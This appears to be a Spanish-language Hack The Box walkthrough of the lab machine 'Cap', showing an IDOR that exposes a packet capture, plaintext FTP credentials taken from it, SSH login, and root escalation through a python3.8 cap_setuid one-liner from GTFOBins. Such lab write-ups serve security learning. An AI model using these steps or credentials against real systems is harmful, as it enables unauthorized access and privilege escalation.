<p>Se observa el puerto 80 abierto, por lo que se procede a abrir el sitio web. Dentro del panel de navegación, se observa un recurso con nombre <em>Security Snapshot (5 Second PCAP + Analysis)</em> y en la dirección URL se accede a <em>data/1</em>; por lo que se procede a modificar el valor de 1 a distintos digitos para observa algun cambio en la web.</p>

<p><img src="/assets/images/htb-cap/cap_web.png" alt=""></p>

<p>Para el número 0, se observan datos capturados, por lo que se procede a descargar el archivo <em>0.pcap</em> para su análisis.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ tcpdump <span class="nt">-r</span> 0.pcap
reading from file 0.pcap, link-type LINUX_SLL <span class="o">(</span>Linux cooked v1<span class="o">)</span>, snapshot length 262144
08:12:49.958142 IP 192.168.196.1.54399 <span class="o">&gt;</span> 192.168.196.16.http: Flags <span class="o">[</span>S], <span class="nb">seq </span>2397486956, win 64240, options <span class="o">[</span>mss 1460,nop,wscale 8,nop,nop,sackOK], length 0
08:12:49.958169 IP 192.168.196.16.http <span class="o">&gt;</span> 192.168.196.1.54399: Flags <span class="o">[</span>S.], <span class="nb">seq </span>239420785, ack 2397486957, win 64240, options <span class="o">[</span>mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
08:12:49.958332 IP 192.168.196.1.54399 <span class="o">&gt;</span> 192.168.196.16.http: Flags <span class="o">[</span>.], ack 1, win 4106, length 0
08:12:49.958383 IP 192.168.196.1.54399 <span class="o">&gt;</span> 192.168.196.16.http: Flags <span class="o">[</span>P.], <span class="nb">seq </span>1:399, ack 1, win 4106, length 398: HTTP: GET / HTTP/1.1
08:12:49.958388 IP 192.168.196.16.http <span class="o">&gt;</span> 192.168.196.1.54399: Flags <span class="o">[</span>.], ack 399, win 501, length 0
08:12:49.959884 IP 192.168.196.16.http <span class="o">&gt;</span> 192.168.196.1.54399: Flags <span class="o">[</span>P.], <span class="nb">seq </span>1:18, ack 399, win 501, length 17: HTTP: HTTP/1.0 200 OK
08:12:49.960000 IP 192.168.196.16.http <span class="o">&gt;</span> 192.168.196.1.54399: Flags <span class="o">[</span>FP.], <span class="nb">seq </span>18:1396, ack 399, win 501, length 1378: HTTP
08:12:49.960263 IP 192.168.196.1.54399 <span class="o">&gt;</span> 192.168.196.16.http: Flags <span class="o">[</span>.], ack 1397, win 4100, length 0
08:12:49.960350 IP 192.168.196.1.54399 <span class="o">&gt;</span> 192.168.196.16.http: Flags <span class="o">[</span>F.], <span class="nb">seq </span>399, ack 1397, win 4100, length 0
08:12:49.960364 IP 192.168.196.16.http <span class="o">&gt;</span> 192.168.196.1.54399: Flags <span class="o">[</span>.], ack 400, win 501, length 0
08:12:50.000377 IP 192.168.196.1.54400 <span class="o">&gt;</span> 192.168.196.16.http: Flags <span class="o">[</span>S], <span class="nb">seq </span>2604434004, win 64240, options <span class="o">[</span>mss 1460,nop,wscale 8,nop,nop,sackOK], length 0
08:12:50.000415 IP 192.168.196.16.http <span class="o">&gt;</span> 192.168.196.1.54400: Flags <span class="o">[</span>S.], <span class="nb">seq </span>4244414476, ack 2604434005, win 64240, options <span class="o">[</span>mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
08:12:50.000613 IP 192.168.196.1.54400 <span class="o">&gt;</span> 192.168.196.16.http: Flags <span class="o">[</span>.], ack 1, win 4106, length 0
08:12:50.000671 IP 192.168.196.1.54400 <span class="o">&gt;</span> 192.168.196.16.http: Flags <span class="o">[</span>P.], <span class="nb">seq </span>1:361, ack 1, win 4106, length 360: HTTP: GET /static/main.css HTTP/1.1
08:12:50.000677 IP 192.168.196.16.http <span class="o">&gt;</span> 192.168.196.1.54400: Flags <span class="o">[</span>.], ack 361, win 501, length 0
08:12:50.002467 IP 192.168.196.16.http <span class="o">&gt;</span> 192.168.196.1.54400: Flags <span class="o">[</span>P.], <span class="nb">seq </span>1:18, ack 361, win 501, length 17: HTTP: HTTP/1.0 200 OK
08:12:50.002607 IP 192.168.196.16.http <span class="o">&gt;</span> 192.168.196.1.54400: Flags <span class="o">[</span>FP.], <span class="nb">seq </span>18:1009, ack 361, win 501, length 991: HTTP
08:12:50.002901 IP 192.168.196.1.54400 <span class="o">&gt;</span> 192.168.196.16.http: Flags <span class="o">[</span>.], ack 1010, win 4102, length 0
08:12:50.003064 IP 192.168.196.1.54400 <span class="o">&gt;</span> 192.168.196.16.http: Flags <span class="o">[</span>F.], <span class="nb">seq </span>361, ack 1010, win 4102, length 0
08:12:50.003079 IP 192.168.196.16.http <span class="o">&gt;</span> 192.168.196.1.54400: Flags <span class="o">[</span>.], ack 362, win 501, length 0
08:12:50.406059 IP 192.168.196.1.54410 <span class="o">&gt;</span> 192.168.196.16.http: Flags <span class="o">[</span>S], <span class="nb">seq </span>2049716514, win 64240, options <span class="o">[</span>mss 1460,nop,wscale 8,nop,nop,sackOK], length 0
08:12:50.406094 IP 192.168.196.16.http <span class="o">&gt;</span> 192.168.196.1.54410: Flags <span class="o">[</span>S.], <span class="nb">seq </span>2608738359, ack 2049716515, win 64240, options <span class="o">[</span>mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
08:12:50.406277 IP 192.168.196.1.54410 <span class="o">&gt;</span> 192.168.196.16.http: Flags <span class="o">[</span>.], ack 1, win 4106, length 0
08:12:50.406347 IP 192.168.196.1.54410 <span class="o">&gt;</span> 192.168.196.16.http: Flags <span class="o">[</span>P.], <span class="nb">seq </span>1:353, ack 1, win 4106, length 352: HTTP: GET /favicon.ico HTTP/1.1
08:12:50.406355 IP 192.168.196.16.http <span class="o">&gt;</span> 192.168.196.1.54410: Flags <span class="o">[</span>.], ack 353, win 501, length 0
08:12:50.407862 IP 192.168.196.16.http <span class="o">&gt;</span> 192.168.196.1.54410: Flags <span class="o">[</span>P.], <span class="nb">seq </span>1:25, ack 353, win 501, length 24: HTTP: HTTP/1.0 404 NOT FOUND
08:12:50.408011 IP 192.168.196.16.http <span class="o">&gt;</span> 192.168.196.1.54410: Flags <span class="o">[</span>FP.], <span class="nb">seq </span>25:394, ack 353, win 501, length 369: HTTP
08:12:50.408145 IP 192.168.196.1.54410 <span class="o">&gt;</span> 192.168.196.16.http: Flags <span class="o">[</span>.], ack 395, win 4104, length 0
08:12:50.408318 IP 192.168.196.1.54410 <span class="o">&gt;</span> 192.168.196.16.http: Flags <span class="o">[</span>F.], <span class="nb">seq </span>353, ack 395, win 4104, length 0
08:12:50.408331 IP 192.168.196.16.http <span class="o">&gt;</span> 192.168.196.1.54410: Flags <span class="o">[</span>.], ack 354, win 501, length 0
08:12:52.582712 IP 192.168.196.1.54411 <span class="o">&gt;</span> 192.168.196.16.ftp: Flags <span class="o">[</span>S], <span class="nb">seq </span>1619097681, win 64240, options <span class="o">[</span>mss 1460,nop,wscale 8,nop,nop,sackOK], length 0
08:12:52.582766 IP 192.168.196.16.ftp <span class="o">&gt;</span> 192.168.196.1.54411: Flags <span class="o">[</span>S.], <span class="nb">seq </span>455236821, ack 1619097682, win 64240, options <span class="o">[</span>mss 1460,nop,nop,sackOK,nop,wscale 7], length 0
08:12:52.583076 IP 192.168.196.1.54411 <span class="o">&gt;</span> 192.168.196.16.ftp: Flags <span class="o">[</span>.], ack 1, win 4106, length 0
08:12:52.585037 IP 192.168.196.16.ftp <span class="o">&gt;</span> 192.168.196.1.54411: Flags <span class="o">[</span>P.], <span class="nb">seq </span>1:21, ack 1, win 502, length 20: FTP: 220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
08:12:52.625835 IP 192.168.196.1.54411 <span class="o">&gt;</span> 192.168.196.16.ftp: Flags <span class="o">[</span>.], ack 21, win 4106, length 0
08:12:54.084642 IP 192.168.196.1.54411 <span class="o">&gt;</span> 192.168.196.16.ftp: Flags <span class="o">[</span>P.], <span class="nb">seq </span>1:14, ack 21, win 4106, length 13: FTP: USER nathan
08:12:54.084668 IP 192.168.196.16.ftp <span class="o">&gt;</span> 192.168.196.1.54411: Flags <span class="o">[</span>.], ack 14, win 502, length 0
08:12:54.084772 IP 192.168.196.16.ftp <span class="o">&gt;</span> 192.168.196.1.54411: Flags <span class="o">[</span>P.], <span class="nb">seq </span>21:55, ack 14, win 502, length 34: FTP: 331 Please specify the password.
08:12:54.125843 IP 192.168.196.1.54411 <span class="o">&gt;</span> 192.168.196.16.ftp: Flags <span class="o">[</span>.], ack 55, win 4106, length 0
08:12:55.383140 IP 192.168.196.1.54411 <span class="o">&gt;</span> 192.168.196.16.ftp: Flags <span class="o">[</span>P.], <span class="nb">seq </span>14:36, ack 55, win 4106, length 22: FTP: PASS Buck3tH4TF0RM3!
08:12:55.383176 IP 192.168.196.16.ftp <span class="o">&gt;</span> 192.168.196.1.54411: Flags <span class="o">[</span>.], ack 36, win 502, length 0
08:12:55.390529 IP 192.168.196.16.ftp <span class="o">&gt;</span> 192.168.196.1.54411: Flags <span class="o">[</span>P.], <span class="nb">seq </span>55:78, ack 36, win 502, length 23: FTP: 230 Login successful.
08:12:55.390943 IP 192.168.196.1.54411 <span class="o">&gt;</span> 192.168.196.16.ftp: Flags <span class="o">[</span>P.], <span class="nb">seq </span>36:42, ack 78, win 4105, length 6: FTP: SYST
08:12:55.390976 IP 192.168.196.16.ftp <span class="o">&gt;</span> 192.168.196.1.54411: Flags <span class="o">[</span>.], ack 42, win 502, length 0
08:12:55.391079 IP 192.168.196.16.ftp <span class="o">&gt;</span> 192.168.196.1.54411: Flags <span class="o">[</span>P.], <span class="nb">seq </span>78:97, ack 42, win 502, length 19: FTP: 215 UNIX Type: L8
08:12:55.436932 IP 192.168.196.1.54411 <span class="o">&gt;</span> 192.168.196.16.ftp: Flags <span class="o">[</span>.], ack 97, win 4105, length 0
08:12:56.267770 IP 192.168.196.1.54411 <span class="o">&gt;</span> 192.168.196.16.ftp: Flags <span class="o">[</span>P.], <span class="nb">seq </span>42:70, ack 97, win 4105, length 28: FTP: PORT 192,168,196,1,212,140
08:12:56.267797 IP 192.168.196.16.ftp <span class="o">&gt;</span> 192.168.196.1.54411: Flags <span class="o">[</span>.], ack 70, win 502, length 0
08:12:56.268016 IP 192.168.196.16.ftp <span class="o">&gt;</span> 192.168.196.1.54411: Flags <span class="o">[</span>P.], <span class="nb">seq </span>97:148, ack 70, win 502, length 51: FTP: 200 PORT <span class="nb">command </span>successful. Consider using PASV.
08:12:56.268656 IP 192.168.196.1.54411 <span class="o">&gt;</span> 192.168.196.16.ftp: Flags <span class="o">[</span>P.], <span class="nb">seq </span>70:76, ack 148, win 4105, length 6: FTP: LIST
08:12:56.269195 IP 192.168.196.16.ftp <span class="o">&gt;</span> 192.168.196.1.54411: Flags <span class="o">[</span>P.], <span class="nb">seq </span>148:187, ack 76, win 502, length 39: FTP: 150 Here comes the directory listing.
08:12:56.269621 IP 192.168.196.16.ftp <span class="o">&gt;</span> 192.168.196.1.54411: Flags <span class="o">[</span>P.], <span class="nb">seq </span>187:211, ack 76, win 502, length 24: FTP: 226 Directory send OK.
08:12:56.269782 IP 192.168.196.1.54411 <span class="o">&gt;</span> 192.168.196.16.ftp: Flags <span class="o">[</span>.], ack 211, win 4105, length 0
08:12:57.338913 IP 192.168.196.1.54411 <span class="o">&gt;</span> 192.168.196.16.ftp: Flags <span class="o">[</span>P.], <span class="nb">seq </span>76:104, ack 211, win 4105, length 28: FTP: PORT 192,168,196,1,212,141
08:12:57.339140 IP 192.168.196.16.ftp <span class="o">&gt;</span> 192.168.196.1.54411: Flags <span class="o">[</span>P.], <span class="nb">seq </span>211:262, ack 104, win 502, length 51: FTP: 200 PORT <span class="nb">command </span>successful. Consider using PASV.
08:12:57.339696 IP 192.168.196.1.54411 <span class="o">&gt;</span> 192.168.196.16.ftp: Flags <span class="o">[</span>P.], <span class="nb">seq </span>104:114, ack 262, win 4105, length 10: FTP: LIST <span class="nt">-al</span>
08:12:57.340307 IP 192.168.196.16.ftp <span class="o">&gt;</span> 192.168.196.1.54411: Flags <span class="o">[</span>P.], <span class="nb">seq </span>262:301, ack 114, win 502, length 39: FTP: 150 Here comes the directory listing.
08:12:57.340646 IP 192.168.196.16.ftp <span class="o">&gt;</span> 192.168.196.1.54411: Flags <span class="o">[</span>P.], <span class="nb">seq </span>301:325, ack 114, win 502, length 24: FTP: 226 Directory send OK.
08:12:57.340779 IP 192.168.196.1.54411 <span class="o">&gt;</span> 192.168.196.16.ftp: Flags <span class="o">[</span>.], ack 325, win 4104, length 0
08:13:17.989210 IP 192.168.196.1.54411 <span class="o">&gt;</span> 192.168.196.16.ftp: Flags <span class="o">[</span>P.], <span class="nb">seq </span>114:122, ack 325, win 4104, length 8: FTP: TYPE I
08:13:17.989363 IP 192.168.196.16.ftp <span class="o">&gt;</span> 192.168.196.1.54411: Flags <span class="o">[</span>P.], <span class="nb">seq </span>325:356, ack 122, win 502, length 31: FTP: 200 Switching to Binary mode.
08:13:17.989689 IP 192.168.196.1.54411 <span class="o">&gt;</span> 192.168.196.16.ftp: Flags <span class="o">[</span>P.], <span class="nb">seq </span>122:150, ack 356, win 4104, length 28: FTP: PORT 192,168,196,1,212,143
08:13:17.989830 IP 192.168.196.16.ftp <span class="o">&gt;</span> 192.168.196.1.54411: Flags <span class="o">[</span>P.], <span class="nb">seq </span>356:407, ack 150, win 502, length 51: FTP: 200 PORT <span class="nb">command </span>successful. Consider using PASV.
08:13:17.990074 IP 192.168.196.1.54411 <span class="o">&gt;</span> 192.168.196.16.ftp: Flags <span class="o">[</span>P.], <span class="nb">seq </span>150:166, ack 407, win 4104, length 16: FTP: RETR notes.txt
08:13:17.990214 IP 192.168.196.16.ftp <span class="o">&gt;</span> 192.168.196.1.54411: Flags <span class="o">[</span>P.], <span class="nb">seq </span>407:433, ack 166, win 502, length 26: FTP: 550 Failed to open file.
08:13:18.033053 IP 192.168.196.1.54411 <span class="o">&gt;</span> 192.168.196.16.ftp: Flags <span class="o">[</span>.], ack 433, win 4104, length 0
08:13:21.085693 IP 192.168.196.1.54411 <span class="o">&gt;</span> 192.168.196.16.ftp: Flags <span class="o">[</span>P.], <span class="nb">seq </span>166:172, ack 433, win 4104, length 6: FTP: QUIT
08:13:21.085794 IP 192.168.196.16.ftp <span class="o">&gt;</span> 192.168.196.1.54411: Flags <span class="o">[</span>P.], <span class="nb">seq </span>433:447, ack 172, win 502, length 14: FTP: 221 Goodbye.
08:13:21.085838 IP 192.168.196.16.ftp <span class="o">&gt;</span> 192.168.196.1.54411: Flags <span class="o">[</span>F.], <span class="nb">seq </span>447, ack 172, win 502, length 0
08:13:21.086194 IP 192.168.196.1.54411 <span class="o">&gt;</span> 192.168.196.16.ftp: Flags <span class="o">[</span>.], ack 448, win 4104, length 0
08:13:21.086523 IP 192.168.196.1.54411 <span class="o">&gt;</span> 192.168.196.16.ftp: Flags <span class="o">[</span>F.], <span class="nb">seq </span>172, ack 448, win 4104, length 0
08:13:21.086530 IP 192.168.196.16.ftp <span class="o">&gt;</span> 192.168.196.1.54411: Flags <span class="o">[</span>.], ack 173, win 502, length 0

</code></pre></div></div>

<p>En la captura, podemos observa credenciales de acceso por FTP; por lo que se procede a ingresar por dicho protocolo con las credenciales identificadas para validar el acceso.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ftp 10.10.10.245
Connected to 10.10.10.245.
220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
Name <span class="o">(</span>10.10.10.245:kamiyo<span class="o">)</span>: nathan
331 Please specify the password.
Password:
230 Login successful.
Remote system <span class="nb">type </span>is UNIX.
Using binary mode to transfer files.
ftp&gt; 
</code></pre></div></div>

<p>Así mismo, sabemos que se encuentra abierto el puerto 22, por lo que es posible acceder con las credenciales identificadas y logramos entrar como el usuario <strong>nathan</strong> y podemos visualizar la flag (user.txt)</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ssh nathan@10.10.10.245
nathan@10.10.10.245<span class="s1">'s password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Aug 26 13:43:25 UTC 2021

  System load:           0.0
  Usage of /:            36.6% of 8.73GB
  Memory usage:          20%
  Swap usage:            0%
  Processes:             221
  Users logged in:       0
  IPv4 address for eth0: 10.10.10.245
  IPv6 address for eth0: dead:beef::250:56ff:feb9:e88e

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

63 updates can be applied immediately.
42 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Thu May 27 11:21:27 2021 from 10.10.14.7
nathan@cap:~$ 

</span></code></pre></div></div>

<p>Ahora sólo falta escalar privilegios, por lo que empezamos a enumerar el sistema para determinar privilegios cuenta el usuario <strong>nathan</strong></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">****</span> Checkar en que grupos se encuentra el usuario <span class="k">****</span>
nathan@cap:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>nathan<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>nathan<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>nathan<span class="o">)</span>
<span class="k">****</span> Checkar archivos que se puedan ejecutar como root <span class="k">****</span>
nathan@cap:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>nathan: 
Sorry, user nathan may not run <span class="nb">sudo </span>on cap.
nathan@cap:~<span class="nv">$ </span><span class="nb">cd</span> /
<span class="k">****</span> Checkar permisos SUID <span class="k">****</span>
nathan@cap:/<span class="nv">$ </span>find <span class="se">\-</span>perm 4000 2&gt;/dev/null
<span class="k">****</span> Checkar capabilities <span class="k">****</span>
nathan@cap:/<span class="nv">$ </span>getcap <span class="nt">-r</span> / 2&gt;/dev/null
/usr/bin/python3.8 <span class="o">=</span> cap_setuid,cap_net_bind_service+eip
/usr/bin/ping <span class="o">=</span> cap_net_raw+ep
/usr/bin/traceroute6.iputils <span class="o">=</span> cap_net_raw+ep
/usr/bin/mtr-packet <span class="o">=</span> cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper <span class="o">=</span> cap_net_bind_service,cap_net_admin+ep
nathan@cap:/<span class="err">$</span>
</code></pre></div></div>

<p>Como se puede observar, se tiene <em>cap_setuid</em> para <em>python3.8</em>, por lo que mediante el sitio <strong>GTFOBINS</strong> podemos obtener el comando a ejecutar para escalar privilegios</p>

<p><a href="https://gtfobins.github.io/gtfobins/python/#capabilities"><strong>Gtfobins</strong></a></p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nathan@cap:/<span class="nv">$ </span>python3 <span class="nt">-c</span> <span class="s1">'import os; os.setuid(0); os.system("/bin/sh")'</span>
<span class="c"># whoami</span>
root
<span class="c"># </span>
</code></pre></div></div>

<p>A este punto ya somos usuario <strong>root</strong> y podemos visualizar la flag (root.txt).</p>

        
      </section>

      <footer class="page__meta">
        
        
  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/tags/#idor" class="page__taxonomy-item" rel="tag">IDOR</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">Linux</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#network" class="page__taxonomy-item" rel="tag">Network</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#python" class="page__taxonomy-item" rel="tag">Python</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#suid" class="page__taxonomy-item" rel="tag">SUID</a><span class="sep">, </span>
    
      
      
      <a href="/tags/#web" class="page__taxonomy-item" rel="tag">Web</a>
    
    </span>
  </p>




  


  
  
  

  <p class="page__taxonomy">
    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
    <span itemprop="keywords">
    
      
      
      <a href="/categories/#easy" class="page__taxonomy-item" rel="tag">Easy</a><span class="sep">, </span>
    
      
      
      <a href="/categories/#linux" class="page__taxonomy-item" rel="tag">Linux</a>
    
    </span>
  </p>


        
          <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Fecha:</strong> <time datetime="2021-10-30T00:00:00-05:00">October 30, 2021</time></p>
        
      </footer>

      

      
  <nav class="pagination">
    
      <a href="/htb-blue/" class="pagination--pager" title="Hack The Box Blue
">Previous</a>
    
    
      <a href="/htb-sizzle/" class="pagination--pager" title="Hack The Box Sizzle
">Next</a>
    
  </nav>

    </div>

    
  </article>

  
</div>

    </div>

    

    <div class="page__footer">
      <footer>
        <!-- start custom footer snippets -->

<!-- end custom footer snippets -->
        <div class="page__footer-follow">
  <ul class="social-icons">
    

    

    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
  </ul>
</div>

<div class="page__footer-copyright">© 2022 K4miyo</div>

      </footer>
    </div>

    
  <script src="/assets/js/main.min.js"></script>
  <script data-search-pseudo-elements defer src="https://use.fontawesome.com/releases/v5.7.1/js/all.js" integrity="sha384-eVEQC9zshBn0rFj4+TU78eNA19HMNigMviK/PU/FFjLXqa/GKPgX58rvt5Z8PLs7" crossorigin="anonymous"></script>








  </body>
</html>
